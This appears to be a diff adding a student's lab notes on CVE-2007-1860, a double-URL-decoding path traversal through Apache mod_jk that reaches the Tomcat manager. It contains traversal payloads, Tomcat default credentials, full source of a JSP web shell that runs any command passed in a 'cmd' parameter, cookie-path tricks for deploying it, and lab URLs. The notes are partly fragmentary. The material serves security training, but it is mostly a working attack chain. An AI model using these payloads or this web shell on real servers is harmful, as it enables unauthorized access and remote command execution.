@@ -1,0 +1,83 @@
+cve-2007-1860
+
+this vulnerability allows an attacker to gain access to unaccessible pages using crafted requests. this is a common trick that a lot of testers miss.
+
+there are two common ways to "proxy" requests from apache to tomcat:
+
+    http_proxy: the requests are forwarded to tomcat using the http protocol;
+    ajp13: the requests are forwarded to tomcat using the ajp13 protocol. this configuration is used in this exercise using the apache module mod_jk.
+
+normal 404s are delivered by apache while those in jsp examples are delivered by tomcat
+
+~~~~~~~~~~~~~~~~~~~~~~
+(*) our goal here is to gain access to the tomcat manager => manager/html
+
+the issue comes from the fact that both the web server (apache using mod_jk) and the application server (tomcat) will perform a decoding of the path provided by the client.
+
+our goal here is to provide a value that will be decoded twice and end up being ... this issue is similar to a directory traversal, it can be used to access file/path that are not available otherwise.
+
+libcurl.so/examples/jsp/%252e%252e/%252e%252e/manager/html
+libcurl.so/examples/jsp/%2e%2e/%2e%2e/manager/html
+libcurl.so/examples/jsp/../../manager/html
+
+apache tomcat default credentials
+username	password
+admin		tomcat
+admin		[blank]
+
+
+~~~~~~~~~~~~~~~~~~~~~~
+deploying a webshell
+
+we can use JSP or servlet, we are using JSP:
+
+```mod_jk.war
+
+<FORM METHOD=GET ACTION='index.jsp'>
+<INPUT name='cmd' type=text>
+<INPUT type=submit value='Run'>
+</FORM>
+<%@ page import="java.io.*" %>
+<%
+   String cmd = request.getParameter("cmd");
+   String output = "";
+   if(cmd != null) {
+      String s = null;
+      try {
+         Process p = Runtime.getRuntime().exec(cmd,null,null);
+         BufferedReader sI = new BufferedReader(new
+InputStreamReader(p.getInputStream()));
+         while((s = sI.readLine()) != null) { output += s+"</br>"; }
+      }  catch(IOException e) {   e.printStackTrace();   }
+   }
+%>
+<pre><%=output %></pre>
+```
+
+> need to change deploy form action url to double encoded
+> when visiting manager, intercept response and set cookie path to "/" instead of "/manager" so that it works on all urls ( we are trying to fool the browser by intercepting the response before it reaches, so that the browser sets the cookie for all urls )
+
+
+
+
+
+learn how to build the webshell
+
+
+
+doesn't work:
+http://ptl-4978138a-05141b98.libcurl.so/examples/%252e%252e/webshell
+
+work:
+http://ptl-4978138a-05141b98.libcurl.so/examples/%252e%252e/webshell/
+
+
+
+
+
+
+
+
+
+
+
